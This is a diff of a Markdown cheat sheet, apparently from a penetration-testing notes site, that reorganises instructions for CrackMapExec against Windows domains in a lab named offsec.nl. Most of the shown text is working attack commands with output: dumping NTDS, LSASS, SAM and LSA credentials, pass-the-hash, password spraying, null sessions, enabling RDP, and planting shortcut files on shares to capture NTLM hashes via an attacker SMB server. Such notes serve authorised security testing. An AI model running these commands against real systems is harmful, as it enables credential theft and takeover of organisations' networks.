@@ -108,7 +108,7 @@ SMB         192.168.10.1    445    SRV2K8R2         [*] Windows Server 2008 R2 S
 SMB         192.168.10.2    445    SRV2016          [*] Windows Server 2016 Standard 14393 x64 (name:SRV2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
 SMB         192.168.10.3    445    WIN10            [*] Windows 10.0 Build 19041 x64 (name:WIN10) (domain:offsec.nl) (signing:False) (SMBv1:False)
 
-$ cat list                                             
+$ cat list
 192.168.10.3
 ```
 
@@ -126,7 +126,7 @@ SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234
 SMB         10.10.10.11     445    DC2019           [+] offsec\johndo:Welkom1234
 ```
 
-#### Dump NTDS
+### Dump NTDS
 
 ```plain
 $ cme smb 10.10.10.10 -u johndo -H caec1e1d755119a15bfb6cd3d5994305 --ntds
@@ -146,49 +146,7 @@ SMB         10.10.10.10     445    DC2016           offsec.nl\adm_johndo:1108:aa
 cme smb <target> -u <user> -p <password> --ntds-history
 ```
 
-#### Modules that can be used
-
-```plain
-$ ./cme smb -L
-
-[*] Get-ComputerDetails       Enumerates sysinfo
-[*] bh_owned                  Set pwned computer as owned in Bloodhound
-[*] bloodhound                Executes the BloodHound recon script on the target and retrieves the results to the attackers' machine
-[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
-[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
-[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
-[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
-[*] get_keystrokes            Logs keys pressed, time and the active window
-[*] get_netdomaincontroller   Enumerates all domain controllers
-[*] get_netrdpsession         Enumerates all active RDP sessions
-[*] get_timedscreenshot       Takes screenshots at a regular interval
-[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
-[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
-[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
-[*] invoke_vnc                Injects a VNC client in memory
-[*] lsassy                    Dump lsass and parse the result remotely with lsassy
-[*] met_inject                Downloads the Meterpreter stager and injects it into memory
-[*] mimikatz                  Dumps all logon credentials from memory
-[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
-[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
-[*] mimikittenz               Executes Mimikittenz
-[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
-[*] netripper                 Capture's credentials by using API hooking
-[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
-[*] rdp                       Enables/Disables RDP
-[*] rid_hijack                Executes the RID hijacking persistence hook.
-[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
-[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
-[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
-[*] test_connection           Pings a host
-[*] tokens                    Enumerates available tokens
-[*] uac                       Checks UAC status
-[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
-[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
-[*] wireless                  Get key of all wireless interfaces
-```
-
-#### Use lsassy module
+### Dump LSASS
 
 ```plain
 $ ./cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy
@@ -210,7 +168,39 @@ LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswo
 LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
 ```
 
-#### Pass the Hash
+Other modules that can be used.
+
+* handlekatz
+* nanodump
+
+### Dump SAM
+
+```plain
+cme smb scope.txt -u administrator -p Welkom1234 --sam
+SMB         10.10.10.10      445    DC2016       [*] Windows 10.0 Build 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:False)
+SMB         10.10.10.10      445    DC2016       [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
+SMB         10.10.10.10      445    DC2016       [+] Dumping SAM hashes
+SMB         10.10.10.10      445    DC2016       Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07:::
+SMB         10.10.10.10      445    DC2016       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.10      445    DC2016       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.10      445    DC2016       [+] Added 3 SAM hashes to the database
+```
+
+### Dump LSA
+
+```plain
+$ cme smb scope.txt -u administrator -p 'Welkom1234' --local-auth --lsa
+SMB         10.10.10.116   445    VMV07     [*] Windows Server 2016 Standard 14393 x64 (name:VMV07) (domain:VMV07) (signing:False) (SMBv1:True)
+SMB         10.10.10.115   445    VMV06     [*] Windows Server 2016 Standard 14393 x64 (name:VMV06) (domain:VMV06) (signing:False) (SMBv1:True)
+SMB         10.10.10.112   445    VMV03     [*] Windows Server 2016 Standard 14393 x64 (name:VMV03) (domain:VMV03) (signing:False) (SMBv1:True)
+SMB         10.10.10.116   445    VMV07     [+] VMV07\administrator:Welkom1234 (Pwn3d!)
+SMB         10.10.10.115   445    VMV06     [+] VMV06\administrator:Welkom1234 (Pwn3d!)
+SMB         10.10.10.116   445    VMV07     offsec.nl/john.do:$DCC2$10240#john.do#fd8d7a9b530fe6978821647e3275a01f
+SMB         10.10.10.110   445    VMV01     offsec.nl/john.do:$DCC2$10240#john.do#6d33d010685524188445af2dddda2c66
+SMB         10.10.10.110   445    VMV01     offsec.nl/jane.do:$DCC2$10240#jane.do#e12335228dd44cb595e37afb3cb14a0c
+```
+
+### Pass the Hash
 
 ```plain
 $ cme smb 10.10.10.10-16 -u administrator -H 97f2592347d8fbe42be381726ff9ea83 -M lsassy
@@ -226,59 +216,15 @@ LSASSY      10.10.10.11     445    DC2019           offsec\Administrator 97f2592
 LSASSY      10.10.10.11     445    DC2019           offsec.nl\Administrator Welkom1234
 ```
 
-#### Dump SAM
+### Check password policy
+
+Unauthenticated:
 
 ```plain
-cme smb scope.txt -u administrator -p Welkom1234 --sam
-SMB         10.10.10.10      445    DC2016       [*] Windows 10.0 Build 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:False)
-SMB         10.10.10.10      445    DC2016       [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
-SMB         10.10.10.10      445    DC2016       [+] Dumping SAM hashes
-SMB         10.10.10.10      445    DC2016       Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07:::
-SMB         10.10.10.10      445    DC2016       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.10.10      445    DC2016       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.10.10      445    DC2016       [+] Added 3 SAM hashes to the database
+cme smb 10.10.10.10 --pass-pol
 ```
 
-#### Dump LSA
-
-```plain
-$ cme smb scope.txt -u administrator -p 'Welkom1234' --local-auth --lsa 
-SMB         10.10.10.116   445    VMV07     [*] Windows Server 2016 Standard 14393 x64 (name:VMV07) (domain:VMV07) (signing:False) (SMBv1:True)
-SMB         10.10.10.115   445    VMV06     [*] Windows Server 2016 Standard 14393 x64 (name:VMV06) (domain:VMV06) (signing:False) (SMBv1:True)
-SMB         10.10.10.112   445    VMV03     [*] Windows Server 2016 Standard 14393 x64 (name:VMV03) (domain:VMV03) (signing:False) (SMBv1:True)
-SMB         10.10.10.116   445    VMV07     [+] VMV07\administrator:Welkom1234 (Pwn3d!)
-SMB         10.10.10.115   445    VMV06     [+] VMV06\administrator:Welkom1234 (Pwn3d!)
-SMB         10.10.10.116   445    VMV07     offsec.nl/john.do:$DCC2$10240#john.do#fd8d7a9b530fe6978821647e3275a01f
-SMB         10.10.10.110   445    VMV01     offsec.nl/john.do:$DCC2$10240#john.do#6d33d010685524188445af2dddda2c66
-SMB         10.10.10.110   445    VMV01     offsec.nl/jane.do:$DCC2$10240#jane.do#e12335228dd44cb595e37afb3cb14a0c
-```
-
-#### Check default (non-authenticated) password policy
-
-```plain
-$ cme smb 10.10.10.10 --pass-pol
-SMB         10.10.10.10     445    DC-01    [*] Windows 10.0 Build 17763 x64 (name:DC-01) (domain:offsec.nl) (signing:False) (SMBv1:False)
-SMB         10.10.10.10     445    DC-01    [+] Dumping password info for domain: OFFSEC
-SMB         10.10.10.10     445    DC-01    Minimum password length: 8
-SMB         10.10.10.10     445    DC-01    Password history length: 15
-SMB         10.10.10.10     445    DC-01    Maximum password age: 
-SMB         10.10.10.10     445    DC-01    
-SMB         10.10.10.10     445    DC-01    Password Complexity Flags: 000001
-SMB         10.10.10.10     445    DC-01        Domain Refuse Password Change: 0
-SMB         10.10.10.10     445    DC-01        Domain Password Store Cleartext: 0
-SMB         10.10.10.10     445    DC-01        Domain Password Lockout Admins: 0
-SMB         10.10.10.10     445    DC-01        Domain Password No Clear Change: 0
-SMB         10.10.10.10     445    DC-01        Domain Password No Anon Change: 0
-SMB         10.10.10.10     445    DC-01        Domain Password Complex: 1
-SMB         10.10.10.10     445    DC-01    
-SMB         10.10.10.10     445    DC-01    Minimum password age: None
-SMB         10.10.10.10     445    DC-01    Reset Account Lockout Counter: 90 minutes 
-SMB         10.10.10.10     445    DC-01    Locked Account Duration: 60 minutes 
-SMB         10.10.10.10     445    DC-01    Account Lockout Threshold: 10
-SMB         10.10.10.10     445    DC-01    Forced Log off Time: Not Set
-```
-
-#### Check password policy for a user
+Authenticated:
 
 ```plain
 $ cme smb 10.10.10.10 -u lisboa -p Welkom1234 --pass-pol
@@ -304,14 +250,14 @@ SMB         10.10.10.10     445    DC2016           Account Lockout Threshold: N
 SMB         10.10.10.10     445    DC2016           Forced Log off Time: Not Set
 ```
 
-#### LDAP protocol / signing check
+### LDAP signing check
 
 ```plain
 $ cme ldap 10.10.10.10 -u john.do -p 'Welkom1234'
 LDAP        10.10.10.10    389    DC2016         [*] Windows Server 2016 Datacenter 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:False) (SMBv1:True)
 ```
 
-#### Enable/disable RDP (local admin required)
+### Enable/disable RDP (local admin required)
 
 ```plain
  cme smb 10.10.10.10 -u 'john_do' -p 'Welkom1234' -M rdp -o ACTION='enable'
@@ -327,13 +273,15 @@ SMB         10.10.10.10    445    PC-01         [+] offsec.nl\john_do:Welkom1234
 RDP         10.10.10.10    445    PC-01         [+] RDP disabled successfully
 ```
 
-#### Enumerate everyone rights shares
+### Enumerate shares
+
+Unauthenticated:
 
 ```plain
 cme smb 10.10.10.0/24 --shares
 ```
 
-#### Enumerate shares
+Authenticated:
 
 ```plain
 $ cme smb 10.10.10.10 -u johndo -p 'Welkom1234!'  --shares
@@ -347,7 +295,11 @@ SMB         10.10.10.10   445    WIN-SHARE      C$                              
 SMB         10.10.10.10   445    WIN-SHARE      TESTSHARE
 ```
 
-#### Remote User Account Control (UAC)
+### Remote User Account Control (UAC)
+
+If you know the user has local administrator rights but you get the error `STATUS_LOGON_TYPE_NOT_GRANTED` or the authentication works but not `Pwn3d!`, Remote User Account Control is likely to be enabled.
+
+Have a look at [Regedit - Disabled Remote UAC]({{< ref "regedit#disable-remote-user-account-control-uac" >}})
 
 ```plain
 $ cme smb 10.10.10.10 -u johndo -p 'Welkom1234!' --local-auth
@@ -355,14 +307,14 @@ SMB         10.10.10.10  445    WIN10            [*] Windows 10.0 Build 17763 x6
 SMB         10.10.10.10  445    WIN10            [-] WIN10\Administrator:Welkom1234! STATUS_LOGON_TYPE_NOT_GRANTED
 ```
 
-#### Trigger NTLM / SMB authentication through shortcut (SLINKY)
+### Trigger NTLM / SMB authentication through shortcut (SLINKY)
 
 [Twitter.com - Slinky](https://twitter.com/mpgn_x64/status/1453018750253424643)
 
 Find a writable share.
 
 ```plain
-$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' --shares                                                   
+$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' --shares
 SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
 SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
 SMB         10.10.10.15   445    SRV_FS         [+] Enumerated shares
@@ -370,14 +322,14 @@ SMB         10.10.10.15   445    SRV_FS         Share           Permissions     
 SMB         10.10.10.15   445    SRV_FS         -----           -----------     ------
 SMB         10.10.10.15   445    SRV_FS         ADMIN$          -               Remote Admin
 SMB         10.10.10.15   445    SRV_FS         C$              -               Default share
-SMB         10.10.10.15   445    SRV_FS         example         READ,WRITE      
+SMB         10.10.10.15   445    SRV_FS         example         READ,WRITE
 SMB         10.10.10.15   445    SRV_FS         IPC$            -               Remote IPC
 ```
 
 Place file on writable share on target system.
 
 ```plain
-$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=examplefile SERVER=10.10.10.20             
+$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=examplefile SERVER=10.10.10.20
 [!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
 SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
 SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
@@ -396,22 +348,16 @@ SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: exampl
 SLINKY      10.10.10.15   445    SRV_FS         [+] Deleted LNK file on the example share
 ```
 
-#### Domain password spray
+### Domain password spray
 
 ```plain
 cme smb <dc-ip> -u <user.txt> -p <password.txt>
 ```
 
-#### NULL sessions
+### NULL sessions
 
 ```plain
-cme smb <ip> -u '' -p '' --pass-pol
-```
-
-#### Enumerate anonymous login
-
-```plain
-cme smb <ip> -u 'a' -p ''
+cme smb <ip> -u '' -p ''
 ```
 
 ### cmeDB - Database containing credentials captured
